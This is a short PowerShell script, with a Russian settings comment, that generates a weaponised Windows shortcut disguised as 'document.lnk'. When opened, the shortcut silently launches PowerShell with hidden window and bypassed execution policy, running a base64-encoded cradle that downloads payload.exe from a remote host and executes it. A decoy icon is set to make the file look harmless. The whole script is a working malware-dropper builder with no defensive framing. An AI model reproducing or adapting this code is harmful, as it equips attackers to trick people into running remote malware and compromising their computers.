# ---- Настройки ----
$URL     = "http://192.168.1.1:8080/payload.exe"
$OutFile = "C:\Temp\document.lnk"
# --------------------

$shell = New-Object -ComObject WScript.Shell
$lnk   = $shell.CreateShortcut($OutFile)

$cradle = "iwr '$URL' -outf `$env:TEMP\s.exe -UseBasicParsing; Start-Process `$env:TEMP\s.exe"

$lnk.TargetPath       = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
$lnk.Arguments        = "-nop -w hidden -ep bypass -enc $([Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cradle)))"
$lnk.IconLocation     = "$env:SystemRoot\System32\shell32.dll, 2"
$lnk.WorkingDirectory = "$env:SystemRoot\System32"
$lnk.Description      = ""

$lnk.Save()
Write-Host "[+] LNK: $OutFile"
